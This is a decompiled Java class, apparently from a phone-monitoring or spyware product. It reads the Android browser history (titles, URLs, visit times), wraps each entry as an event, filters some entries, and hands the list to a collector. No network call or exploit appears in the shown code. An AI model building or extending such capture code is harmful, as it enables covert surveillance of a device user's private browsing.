package com.vvt.capture.browserurl;

import android.content.ContentResolver;
import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.g;
import com.vvt.events.FxBrowserUrlEvent;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private com.vvt.base.a c;
  private e d;
  private com.vvt.base.capture.f e;
  private String f;
  
  public a(String paramString, RunningMode paramRunningMode, Context paramContext, com.vvt.base.a parama)
  {
    this.f = paramString;
    ContentResolver localContentResolver = paramContext.getContentResolver();
    Object localObject = RunningMode.FULL;
    int i;
    int j;
    if (paramRunningMode == localObject)
    {
      i = 1;
      j = i;
      if (j == 0) {
        break label96;
      }
      localObject = new com/vvt/capture/browserurl/a/c;
      ((com.vvt.capture.browserurl.a.c)localObject).<init>(paramString);
      label49:
      this.d = ((e)localObject);
      if (j == 0) {
        break label111;
      }
      localObject = new com/vvt/capture/browserurl/a/f;
      ((com.vvt.capture.browserurl.a.f)localObject).<init>(paramString);
    }
    for (;;)
    {
      this.e = ((com.vvt.base.capture.f)localObject);
      this.c = parama;
      return;
      i = 0;
      localObject = null;
      j = 0;
      break;
      label96:
      localObject = new com/vvt/capture/browserurl/b/a;
      ((com.vvt.capture.browserurl.b.a)localObject).<init>(localContentResolver);
      break label49;
      label111:
      localObject = new com/vvt/capture/browserurl/b/c;
      ((com.vvt.capture.browserurl.b.c)localObject).<init>(localContentResolver);
    }
  }
  
  private FxBrowserUrlEvent a(BrowserUrlData paramBrowserUrlData)
  {
    FxBrowserUrlEvent localFxBrowserUrlEvent = new com/vvt/events/FxBrowserUrlEvent;
    localFxBrowserUrlEvent.<init>();
    long l = paramBrowserUrlData.a();
    localFxBrowserUrlEvent.setEventId(l);
    l = paramBrowserUrlData.d();
    localFxBrowserUrlEvent.setEventTime(l);
    String str = paramBrowserUrlData.b();
    localFxBrowserUrlEvent.setTitle(str);
    str = paramBrowserUrlData.c();
    localFxBrowserUrlEvent.setUrl(str);
    l = paramBrowserUrlData.e();
    localFxBrowserUrlEvent.setVisitTimeMs(l);
    localFxBrowserUrlEvent.setOwningApp("com.android.browser");
    localFxBrowserUrlEvent.setBlocked(false);
    return localFxBrowserUrlEvent;
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public List a()
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject2 = this.e;
    boolean bool2 = localObject2 instanceof com.vvt.capture.browserurl.b.c;
    if (bool2) {
      localObject1 = ((com.vvt.capture.browserurl.b.c)this.e).b();
    }
    for (;;)
    {
      localObject2 = ((List)localObject1).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject2).hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = (BrowserUrlData)((Iterator)localObject2).next();
        localObject1 = a((BrowserUrlData)localObject1);
        localArrayList.add(localObject1);
      }
      localObject2 = this.e;
      bool2 = localObject2 instanceof com.vvt.capture.browserurl.a.f;
      if (bool2) {
        localObject1 = ((com.vvt.capture.browserurl.a.f)this.e).b();
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  protected void a(List paramList)
  {
    boolean bool1 = b;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = b;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool3 = localObject instanceof BrowserUrlData;
      if (bool3)
      {
        localObject = (BrowserUrlData)localObject;
        String str = ((BrowserUrlData)localObject).b();
        bool3 = com.vvt.ag.b.a(str);
        if (!bool3)
        {
          localObject = a((BrowserUrlData)localObject);
          localArrayList.add(localObject);
        }
      }
    }
    Object localObject = this.c;
    if (localObject != null)
    {
      int i = localArrayList.size();
      if (i > 0)
      {
        bool2 = b;
        if (bool2) {}
        localObject = this.c;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
    boolean bool2 = b;
    if (bool2) {}
  }
  
  public boolean a(String paramString)
  {
    boolean bool = false;
    Object localObject1 = null;
    Object localObject2 = this.e;
    int i;
    if (localObject2 != null)
    {
      localObject1 = this.e;
      bool = localObject1 instanceof com.vvt.capture.browserurl.a.f;
      if (!bool) {
        break label58;
      }
      localObject1 = (com.vvt.capture.browserurl.a.f)this.e;
      localObject2 = BrowserUrlData.UrlType.HISTORY;
      i = 20;
    }
    for (bool = ((com.vvt.capture.browserurl.a.f)localObject1).a((BrowserUrlData.UrlType)localObject2, paramString, i);; bool = ((com.vvt.capture.browserurl.b.c)localObject1).a((BrowserUrlData.UrlType)localObject2, paramString))
    {
      return bool;
      label58:
      localObject1 = (com.vvt.capture.browserurl.b.c)this.e;
      localObject2 = BrowserUrlData.UrlType.HISTORY;
    }
  }
  
  protected e b()
  {
    return this.d;
  }
  
  protected com.vvt.base.capture.f c()
  {
    return this.e;
  }
  
  protected String d()
  {
    return "BrowserUrlCapture";
  }
  
  protected String e()
  {
    return this.f;
  }
  
  protected String f()
  {
    return "browserurl.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/browserurl/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */